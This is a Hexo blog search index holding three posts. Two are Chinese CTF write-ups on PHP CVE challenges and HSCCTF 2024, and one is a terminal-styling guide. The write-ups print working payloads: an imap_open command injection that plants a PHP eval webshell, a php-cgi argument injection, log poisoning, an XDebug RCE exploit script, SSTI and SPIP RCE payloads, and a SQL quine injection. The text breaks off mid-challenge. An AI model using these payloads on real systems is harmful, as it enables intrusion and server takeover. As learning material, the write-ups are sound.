<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP_CVE</title>
      <link href="/2024/03/14/PHP-CVE/"/>
      <url>/2024/03/14/PHP-CVE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-CVE"><a href="#PHP-CVE" class="headerlink" title="PHP#CVE"></a>PHP#CVE</h1><h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><p>老漏洞，没搜到什么东西，全是工具秒了</p><p><code>https://github.com/neex/phuip-fpizdam</code></p><p>克隆下来（需要GO环境</p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><pre><code class="sh">//目录跳转cd phuip-fpizdam//安装所需go get -v &amp;&amp; go build</code></pre><p> 执行：</p><pre><code class="go">go run . url/index.php</code></pre><p>例如</p><pre><code class="go">go run . http://6606d445-de7e-4181-b685-cd3da78fe39d.challenge.ctf.show/index.php</code></pre><p>等出现Done!</p><p>执行命令，在HackBar GET传参</p><pre><code class="http">?a=cat flag</code></pre><h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><p>查看</p><p><code>X-Powered-By：PHP/5.6.38</code></p><p><a href="https://blog.csdn.net/qq_46501419/article/details/115050909">搜索</a>发现是<strong>CVE-2018-19518</strong></p><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。     </p></blockquote><p>需要了解的前置知识</p><h3 id="邮件访问协议！IMAP协议解析"><a href="#邮件访问协议！IMAP协议解析" class="headerlink" title="邮件访问协议！IMAP协议解析"></a><a href="https://zhuanlan.zhihu.com/p/446369720">邮件访问协议！IMAP协议解析</a></h3><p>参考利用可知ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令 攻击者通过注入注入这个参数 最终将导致命令执行漏洞</p><blockquote><p>ProxyCommand 指定用于连接服务器的命令。命令字符串扩展到行的末尾，并使用用户的shell’  exec’指令执行，以避免延迟的shell进程。 ProxyCommand接受TOKENS  部分中描述的令牌的参数。该命令基本上可以是任何东西，并且应该从其标准输入读取并写入其标准输出。它应该最终连接在某台机器上运行的sshd服务器，或者在sshd -i某处执行。主机密钥管理将使用所连接主机的HostName完成（默认为用户键入的名称）。设置命令以none完全禁用此选项。请注意，  CheckHostIP无法与代理命令连接。 该指令与nc及其代理支持结合使用非常有用。例如，以下指令将通过192.0.2.0的HTTP代理连接： ProxyCommand &#x2F;usr&#x2F;bin&#x2F;nc -X connect -x 192.0.2.0:8080 %h %p</p></blockquote><h3 id="其他相关漏洞"><a href="#其他相关漏洞" class="headerlink" title="其他相关漏洞"></a>其他相关漏洞</h3><p><a href="https://nosec.org/home/detail/2044.html">如何利用imap绕过PHP中的disable_functions（CVE-2018-19518）|NOSEC安全讯息平台 – 白帽汇安全研究院</a></p><p><a href="https://www.cnblogs.com/biing/p/13049730.html">CVE-2018-19518 PHP imap_open函数任意命令执行漏洞复现 – biiNG</a></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>即使没有连接成功，也成功的把命令写入到了文件，这也就是我们系统被攻击的成因。</p><pre><code class="php">hostname=x+-oProxyCommand%3decho%09ZWNobyAnSGVsbG8nPi90bXAvdGVzdA%3d%3d|base64%09-d|sh&#125;&amp;username=111&amp;password=222</code></pre><p>通过参考给出的POC</p><pre><code class="php">hostname=x+-oProxyCommand%3decho%09通过base64加密过的执行语句|base64%09-d|sh&#125;</code></pre><p> 我们将一句话木马</p><pre><code class="php">&lt;?php eval($_POST[hello]);?&gt;</code></pre><p>经过base64编码得到</p><pre><code class="php">PD9waHAgZXZhbCgkX1BPU1RbaGVsbG9dKTs/Pg==</code></pre><p>使用echo执行解码并且写入shell语句</p><pre><code class="php">echo &quot;PD9waHAgZXZhbCgkX1BPU1RbaGVsbG9dKTs/Pg==&quot; | base64 -d &gt;/var/www/html/s7.php</code></pre><p>因为我们要通过头部传输 所以应该将上面的代码先结果base64编码在转换为url编码</p><pre><code class="php">hostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiYUdWc2JHOWRLVHMvUGc9PSIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvczcucGhw|base64%09-d|sh&#125;</code></pre><p>蚁剑链接 s7.php 密码hello 编码为 base64</p><h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><p><strong>PHP-CGI远程代码执行漏洞（CVE-2012-1823)</strong></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>php &lt; 5.3.12</p><p>php &lt; 5.4.2</p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>本漏洞只出现在以cgi模式运行的php中。</p><h3 id="介绍一下PHP的运行模式"><a href="#介绍一下PHP的运行模式" class="headerlink" title="介绍一下PHP的运行模式"></a>介绍一下PHP的运行模式</h3><p>下载PHP源码，可以看到其中有个目录叫sapi。sapi在PHP中的作用，类似于一个消息的“传递者”，比如在《Fastcgi协议分析  &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp;  Exp编写》一文中介绍的fpm，他的作用就是接受Web容器通过fastcgi协议封装好的数据，并交给PHP解释器执行。</p><p>除了fpm，最常见的sapi应该是用于Apache的mod_php，这个sapi用于php和apache之间的数据交换。</p><p>php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi，在安装Apache的时候默认有一个cgi-bin目录，最早就是放置这些cgi脚本用的。</p><p>但cgi模式有个致命的缺点，众所周知，进程的创建和调度都是有一定消耗的，而且进程的数量也不是无限的。所以，基于cgi模式运行的网站通常不能同时接受大量请求，否则每个请求生成一个子进程，就有可能把服务器挤爆。于是后来就有了fastcgi，fastcgi进程可以将自己一直运行在后台，并通过fastcgi协议接受数据包，执行后返回结果，但自身并不退出。</p><p>php有一个叫php-cgi的sapi，php-cgi有两个功能，一是提供cgi方式的交互，二是提供fastcgi方式的交互。也就说，我们可以像perl一样，让web容器直接fork一个php-cgi进程执行某脚本；也可以在后台运行php-cgi -b 127.0.0.1:9000（php-cgi作为fastcgi的管理器），并让web容器用fastcgi协议和9000交互。</p><p>那我之前说的fpm又是什么呢？为什么php有两个fastcgi管理器？php确实有两个fastcgi管理器，php-cgi可以以fastcgi模式运行，fpm也是以fastcgi模式运行。但fpm是php在5.3版本以后引入的，是一个更高效的fastcgi管理器，其诸多优点我就不多说了，可以自己去翻翻源码。因为fpm优点更多，所以现在越来越多的web应用使用php-fpm去运行php。</p><h4 id="PHP的四种运行模式"><a href="#PHP的四种运行模式" class="headerlink" title="PHP的四种运行模式"></a>PHP的四种运行模式</h4><ol><li><p>CGI</p><p>全称是“通用网关接口”(Common Gateway Interface)，  它可以让一个客户端，从网页浏览器向执行在Web服务器上的程序请求数据，描述的是客户端和这个程序之间传输数据的一种标准，另外CGI独立于任何语言，所以可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php,perl,tcl等。</p><p>CGI针对每个用户请求都要开单独的子进程去维护，所以数量多的时候会出现性能问题，最近几年很少用。</p></li><li><p>FastCGI</p><p>CGI的升级版本，FastCGI 像是一个常驻 (long-live) 型的 CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去解析php.ini、重新载入全部dll扩展并重初始化全部数据结构。</p><p>PHP使用PHP-FPM(FastCGI Process Manager)，全称PHP FastCGI进程管理器进行管理。</p></li><li><p>Cli</p><p>PHP-CLI是PHP Command Line Interface的简称，就是PHP在命令行运行的接口，区别于在Web服务器上运行的PHP环境（PHP-CGI等）。</p><p> 在php-cli模式下我们可以直接启动一个php文件并执行，就像workerman中一样</p></li><li><p>Module加载</p><p>这种方式一般是针对apache而言的，它是把php作为apache的一个子模块来运行。</p></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这个漏洞简单来说，就是用户请求的querystring（查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果</p><p>探究一下原理，<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>中规定，当querystring中不包含没有解码的<code>=</code>号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能。</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre><code class="http">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1Host: aac0066c-ebf4-4cf2-97a2-00b3b7ad9c61.challenge.ctf.showUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 44&lt;?php echo shell_exec(&quot;cat /some*/f*&quot;); ?&gt;</code></pre><h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><blockquote><p>hint：严格说算不上cve</p></blockquote><pre><code class="php"> &lt;?phperror_reporting(0);highlight_file(__FILE__);//phpinfo$file = $_GET[&#39;f&#39;];if(!preg_match(&#39;/\:/&#39;,$file))&#123;    include($file);&#125;</code></pre><p>过滤掉了冒号，也就是不能用伪协议，可以使用</p><ol><li>PHP_SESSION_UPLOAD_PROGRESS文件包含</li><li>日志包含</li></ol><h2 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h2><p>这个功能在php5.4以上能够利用。</p><p>在 php.ini 有以下几个默认选项。</p><pre><code class="php">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</code></pre><p>只需要了解前四个配置：</p><pre><code class="php">enabled=on 表示 upload_progress 功能开始，意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息（如上传时间）储存在session 中；cleanup= on 表示当文件上传结束后，php 将会立刻清空文件当中的内容。这选项很重要。 name当他出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；prefix + name 将表示为 session 中的键名 。</code></pre><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>其实，如果 session.auto_start&#x3D;On,则php 在接收请求的时候会自动初始化session，不需要再执行session_start()。但默认情况下，这个选项是关闭的。</p><p>但session还有一个默认选项，session.user_strict_mode(严格会话模式)默认值为0（关闭），此时用户是可以定义自己的 session ID 的。比如，我们在Cookie 中设置 PHPsessid &#x3D; snowy 那么php将会在服务器创建一个文件：&#x2F;tmp&#x2F;sess_snowy .   即使用户没有初始化session，php也会自动初始化session 并产生一个键值，这个键值有 ini.get(“session.upload_progress.prefix”) + 由我们构造的seesion.upload_progress值组成，最后被写入sess_文件里。</p><p>这里没有利用，具体实现<a href="https://blog.csdn.net/q20010619/article/details/120594729">参考</a></p><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>利用 <code>User-Agent</code> 把shell写入日志，然后再包含日志就可以了，又因为使用的是 Nginx 服务器，所以默认日志位置为 <code>/var/log/nginx/access.log</code></p><p><img src="/img/image-20240314201110147.png"></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre><code class="http">?f=/var/log/nginx/access.log</code></pre><pre><code class="http">User-Agent: &lt;?php system(&#39;cat /fl6g&#39;);?&gt;</code></pre><p><img src="/../../themes/3-hexo/source/img/image-20240314201557152.png"></p><h1 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h1><blockquote><p>hint : debug开启，端口9000</p></blockquote><p>看到php版本为：PHP&#x2F;7.1.12</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">XDebug 远程调试漏洞</a></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p><pre><code class="ini">xdebug.remote_connect_back = 1xdebug.remote_enable = 1</code></pre><p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><pre><code class="python">#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#39;&#125;def recv_xml(sock):    blocks = []    data = b&#39;&#39;    while True:        try:            data = data + sock.recv(1024)        except socket.error as e:            break        if not data:            break        while data:            eop = data.find(b&#39;\x00&#39;)            if eop &lt; 0:                break            blocks.append(data[:eop])            data = data[eop+1:]        if len(blocks) &gt;= 4:            break        return blocks[3]def trigger(url):    time.sleep(2)    try:        session.get(url + &#39;?XDEBUG_SESSION_START=phpstorm&#39;, timeout=0.1)    except:        passif __name__ == &#39;__main__&#39;:    parser = argparse.ArgumentParser(description=&#39;XDebug remote debug code execution.&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, required=True, help=&#39;the code you want to execute.&#39;)    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, required=True, help=&#39;target url.&#39;)    parser.add_argument(&#39;-l&#39;, &#39;--listen&#39;, default=9000, type=int, help=&#39;local port&#39;)    args = parser.parse_args()        ip_port = (&#39;0.0.0.0&#39;, args.listen)    sk = socket.socket()    sk.settimeout(10)    sk.bind(ip_port)    sk.listen(5)    pool.submit(trigger, args.target)    conn, addr = sk.accept()    conn.sendall(b&#39;&#39;.join([b&#39;eval -i 1 -- &#39;, base64.b64encode(args.code.encode()), b&#39;\x00&#39;]))    data = recv_xml(conn)    print(&#39;[+] Recieve data: &#39; + data.decode())    g = re.search(rb&#39;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#39;, data, re.I)    if not g:        print(&#39;[-] No result...&#39;)        sys.exit(0)    data = g.group(1)    try:        print(&#39;[+] Result: &#39; + base64.b64decode(data).decode())    except binascii.Error:        print(&#39;[-] May be not string result...&#39;)</code></pre><p>反向连接，启动后监听本地9000端口(可通过-l参数指定) 需要有外网</p><pre><code class="python">python3 XDebug.py -t http://pwn.challenge.ctf.show:28100/index.php -c &#39;shell_exec(&quot;ls /&quot;);&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> PHPCVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beautify_Shell</title>
      <link href="/2024/03/13/Beautify-Shell/"/>
      <url>/2024/03/13/Beautify-Shell/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次终端美化"><a href="#记一次终端美化" class="headerlink" title="记一次终端美化"></a>记一次终端美化</h1><blockquote><p>windows系统利用<a href="https://github.com/JanDeDobbeleer/oh-my-posh">oh-my-posh</a>美化终端，包括CMD,POWSHELL,GITBASH,WSL(UBUNTU)</p><p>会增加CPU负担，慎重选择</p></blockquote><p>因为是同一系统上，这里直接在windows上安装oh-my-posh和对应字体</p><p><code>wsl需要再安装一次oh-my-posh</code></p><p><a href="https://ohmyposh.dev/">官方文档</a></p><h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="/img/image-20240313200104188.png"></p><p><img src="/img/image-20240313200129408.png"></p><p><img src="/img/image-20240313200142264.png"></p><p><img src="/img/image-20240313200258457.png"></p><p><img src="/img/image-20240313200326024.png"></p><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p><a href="https://www.nerdfonts.com/font-downloads">https://www.nerdfonts.com/font-downloads</a></p><p>下载喜欢的，解压后全选，右键点击安装</p><h2 id="文件图标库"><a href="#文件图标库" class="headerlink" title="文件图标库"></a>文件图标库</h2><p>安装字体后安装</p><pre><code class="shell">Install-Module -Name Terminal-Icons -Repository PSGallery</code></pre><h2 id="oh-my-posh"><a href="#oh-my-posh" class="headerlink" title="oh-my-posh"></a>oh-my-posh</h2><p>powershell管理员打开</p><pre><code class="sh">Install-Module oh-my-posh -Scope CurrentUser -SkipPublisherCheck #一路Y</code></pre><h2 id="安装posh-git"><a href="#安装posh-git" class="headerlink" title="安装posh-git"></a>安装posh-git</h2><pre><code class="sh">Install-Module -Name PSReadLine -Scope CurrentUser -Force -SkipPublisherCheck</code></pre><h2 id="安装检测"><a href="#安装检测" class="headerlink" title="安装检测"></a>安装检测</h2><pre><code class="sh">oh-my-posh --version</code></pre><h1 id="POWERSHELL"><a href="#POWERSHELL" class="headerlink" title="POWERSHELL"></a>POWERSHELL</h1><h2 id="设置字体"><a href="#设置字体" class="headerlink" title="设置字体"></a>设置字体</h2><p>在终端设置里，选择支持字体（Nerd Fonts字体）</p><p>例如<img src="/img/image-20240313170828698.png"></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><pre><code class="shell"># 通过记事本打开powershell配置文件notepad $PROFILE # 若上述命令报错，找不到powershell配置文件，则需创建powershell配置文件，执行如下命令New-Item -Path $PROFILE -Type File -Force</code></pre><p>内容如下</p><pre><code class="shell">oh-my-posh init pwsh --config &quot;C:\Users\CGjue\AppData\Local\Programs\oh-my-posh\themes\atomic.omp.json&quot;  |  Invoke-Expression #主题地址Import-Module posh-git # 引入 posh-gitImport-Module Terminal-Icons Import-Module -Name Terminal-Icons  # 引入文件图标库# 设置主题 # Set-PSReadLineOption -PredictionSource History # 设置预测文本来源为历史记录Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete # 设置 Tab 键，命令行自动补全和提示# Set-PSReadLineKeyHandler -Key &quot;Ctrl+d&quot; -Function MenuComplete # 设置 Ctrl+d 为菜单补全和 Intellisense# Set-PSReadLineKeyHandler -Key UpArrow -Function HistorySearchBackward # 设置向上键为后向搜索历史记录# Set-PSReadLineKeyHandler -Key DownArrow -Function HistorySearchForward # 设置向下键为前向搜索历史纪录</code></pre><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>脚本未签名，运行不了,尝试自签失败</p><p>改个<a href="https://learn.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4">配置</a>，有危险，自行决定</p><table><thead><tr><th align="center">组策略</th><th>执行策略</th></tr></thead><tbody><tr><td align="center">允许所有脚本</td><td>Unrestricted</td></tr><tr><td align="center">允许本地脚本和远程签名脚本</td><td>RemoteSigned</td></tr><tr><td align="center">仅允许签名脚本</td><td>AllSigned</td></tr></tbody></table><p>运行</p><pre><code class="sh">set-executionpolicy  remotesigned#允许本地脚本和远程签名脚本</code></pre><p>然后运行</p><pre><code class="shell">.$PROFILE</code></pre><h1 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h1><p>完成前置后，安装<a href="https://github.com/chrisant996/clink/releases">clink工具</a>，双击exe安装包即可安装</p><p>然后，进入clink安装目录，创建oh-my-posh.<a href="https://so.csdn.net/so/search?q=lua&spm=1001.2101.3001.7020">lua</a>文件，添加如下内容：</p><pre><code class="shell">load(io.popen(&#39;oh-my-posh init cmd&#39;):read(&quot;*a&quot;))()</code></pre><p>重启生效</p><h1 id="GITBASH"><a href="#GITBASH" class="headerlink" title="GITBASH"></a>GITBASH</h1><h2 id="字体-1"><a href="#字体-1" class="headerlink" title="字体"></a>字体</h2><p>右键，文本，选择字体（Nerd Fonts类字体）</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>将 “~\AppData\Local\Programs\oh-my-posh\themes\你想用的主题.omp.json” 文件拷贝到 C:\Users\你的用户名 目录下；再在 ~&#x2F;.profile 文件（没有则touch .profile创建）添加命令，后执行 . ~&#x2F;.profile 刷新，重启终端即可生效。</p><pre><code class="shell">eval &quot;$(oh-my-posh --init --shell bash --config ~/agnosterplus.omp.json)&quot;</code></pre><h1 id="WSL"><a href="#WSL" class="headerlink" title="WSL"></a>WSL</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>Oh my posh 64位版本，并导入到 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;oh-my-posh 路径下</p><pre><code class="shell">sudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-posh</code></pre><p>若github 下载速度慢，可以参照网络上 github 加速方法，更换下载源</p><pre><code class="shell">sudo wget https://github.91chi.fun/https://github.com//JanDeDobbeleer/oh-my-posh/releases/download/v7.61.0/posh-linux-amd64 -O /usr/local/bin/oh-my-posh</code></pre><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>为 oh-my-posh 添加运行权限</p><pre><code class="shell">sudo chmod +x /usr/local/bin/oh-my-posh</code></pre><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><pre><code class="shell">#ubuntu系统vi ~/.bashrc #kali系统vi ~/.zshrc</code></pre><p>添加如下代码</p><pre><code class="shell">eval &quot;$(oh-my-posh --init --shell bash --config 主题路径)&quot;</code></pre><p>例如</p><pre><code class="shell">eval &quot;$(oh-my-posh --init --shell bash --config /mnt/c/Users/CGjue/AppData/Local/Programs/oh-my-posh/themes/kushal.omp.json)&quot;</code></pre><h1 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h1><h2 id="字体-2"><a href="#字体-2" class="headerlink" title="字体"></a>字体</h2><p>打开设置，搜索font</p><p><img src="/img/image-20240313172441192.png"></p><pre><code class="shell">Consolas, &#39;MesloLGL Nerd Font Mono&#39;, monospace #MesloLGL Nerd Font Mono换自己喜欢的字体也可以直接MesloLGL Nerd Font Mono</code></pre><h2 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h2><ol><li>在VSCODE中按键 CTRL+ SHIFT + P</li><li>输入 Terminal select default profile</li><li>选择默认的终端 WINDOWS：powershell, terminal等</li></ol><p>设置后会跟随默认的终端配置</p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF#2024</title>
      <link href="/2024/03/11/HSCCTF-2024/"/>
      <url>/2024/03/11/HSCCTF-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="2024HSCCTF"><a href="#2024HSCCTF" class="headerlink" title="2024HSCCTF"></a>2024HSCCTF</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><p>010手提出来图片，<strong>两个JPG头尾</strong></p><p><img src="/img/image-20240311180455871.png"></p><p><strong>HAPPY_NEW_YEAR</strong>猜测是密码</p><p> outguess提取</p><pre><code class="sh">outguess -k HAPPY_NEW_YEAR -r happy.jpg 1.txt</code></pre><blockquote><p>HSCCTF{Welcome_to_HSCCTF}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ccut&quot;);function waffff($sql) &#123;if(preg_match(&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\/i&quot;, $sql)) &#123;die(&quot;hacker&quot;);&#125;&#125;if (isset($_POST[&#39;password&#39;])) &#123;$password = $_POST[&#39;password&#39;];waffff($password);$sql = &quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;$password&#39;&quot;;$user_result = mysqli_query($con,$sql);$row = mysqli_fetch_array($user_result);if ($row[&#39;password&#39;] === $password) &#123;include &quot;/flag&quot;;&#125; else &#123;echo &quot;error&quot;;&#125;&#125;</code></pre><p><strong>quine注入</strong><br>核心思想就是让<strong>sql语句执行的结果等于sql语句本身</strong>，来绕过这个验证</p><pre><code class="php">$row[&#39;password&#39;] === $password</code></pre><p>payload:</p><pre><code class="php">password=&#39;UNION/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;1&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;1&quot;)%23&#39;,CHAR(34),CHAR(39)),CHAR(49),&#39;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;1&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;1&quot;)%23&#39;)%23</code></pre><p>quine最好玩的就在replace和char的配合上</p><blockquote><p>CHAR(34)&#x3D;”<br>CHAR(39)&#x3D;’<br>CHAR(33)&#x3D;!</p></blockquote><p>REPLACE ( string_expression , string_pattern , string_replacement )<br>参数含义：<br>string_expression 要搜索的字符串表达式。string_expression 可以是字符或二进制数据类<br>型。<br>string_pattern 是要查找的子字符串。string_pattern 可以是字符或二进制数据类型。<br>string_pattern 不能是空字符串 (‘’)。<br>string_replacement 替换字符串。string_replacement 可以是字符或二进制数据类型。</p><h2 id="SHIROSHORTMENSHELL"><a href="#SHIROSHORTMENSHELL" class="headerlink" title="SHIROSHORTMENSHELL"></a>SHIROSHORTMENSHELL</h2><p>工具秒了</p><p> <img src="/img/image-20240311181144599.png"></p><h2 id="TMPL"><a href="#TMPL" class="headerlink" title="TMPL"></a>TMPL</h2><p>ssti过滤了.’”+[]</p><pre><code class="python">&#123;%set unn=(lipsum|escape|batch(22)|list|first|last)%&#125;&#123;%set perc=(lipsum()|urlencode|first)%&#125;&#123;&#123;(((((((lipsum|attr(unn*2~((dict(g=x)|join)~(dict(l=x)|join)~(dict(o=x)|join)~(dict(b=x)|join)~(dict(a=x)|join)~(dict(l=x)|join)~(dict(s=x)|join))~unn*2))|attr(unn*2~((dict(g=x)|join)~(dict(e=x)|join)~(dict(t=x)|join)~(dict(i=x)|join)~(dict(t=x)|join)~(dict(e=x)|join)~(dict(m=x)|join))~unn*2))(unn*2~((dict(b=x)|join)~(dict(u=x)|join)~(dict(i=x)|join)~(dict(l=x)|join)~(dict(t=x)|join)~(dict(i=x)|join)~(dict(n=x)|join)~(dict(s=x)|join))~unn*2)|attr(unn*2~((dict(g=x)|join)~(dict(e=x)|join)~(dict(t=x)|join)~(dict(i=x)|join)~(dict(t=x)|join)~(dict(e=x)|join)~(dict(m=x)|join))~unn*2))(unn*2~((dict(i=x)|join)~(dict(m=x)|join)~(dict(p=x)|join)~(dict(o=x)|join)~(dict(r=x)|join)~(dict(t=x)|join))~unn*2)(((dict(o=x)|join)~(dict(s=x)|join)))|attr(((dict(p=x)|join)~(dict(o=x)|join)~(dict(p=x)|join)~(dict(e=x)|join)~(dict(n=x)|join))))((((perc~(dict(c=x)|join))*9)%(99,97,116,32,47,102,108,97,103))))|attr(((dict(r=x)|join)~(dict(e=x)|join)~(dict(a=x)|join)~(dict(d=x)|join))))())&#125;&#125;</code></pre><h2 id="DESERIALIZATION"><a href="#DESERIALIZATION" class="headerlink" title="DESERIALIZATION"></a>DESERIALIZATION</h2><p>搜索发现是SPIP漏洞【SPIP远程代码执行漏洞(CVE-2023-27372)】<br>借用文章里的payload发现php被过滤了，短标签绕过，</p><pre><code class="php">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X+uk1lEX5F3/09Cb1W8MzTye1Q==&amp;oubli=s:35:&quot;&lt;?=passthru(&#39;cut -c 1-50 /fla?&#39;);?&quot;;&amp;nobot=fr</code></pre><p>payload注意反序列化字符串需要对应上</p><h2 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h2><p><a href="https://blog.csdn.net/Jayjay___/article/details/134147184">借鉴佬博客</a><br>花了10分看了hint才出<br>hint:同学发给我一个网址<a href="https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c07604">https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c07604</a><br>96&amp;applicant&#x3D;admin&amp;filename&#x3D;web.log，说让我帮忙看看网站运行日志，同学说这<br>是他写的一个非常安全方便的文件查看器。 真的安全吗？<br>源码如下</p><pre><code class="php">&lt;?phperror_reporting(0);$secret=getenv(&quot;SECRETKEY&quot;); # For security reasons, the key length is greater than 8. 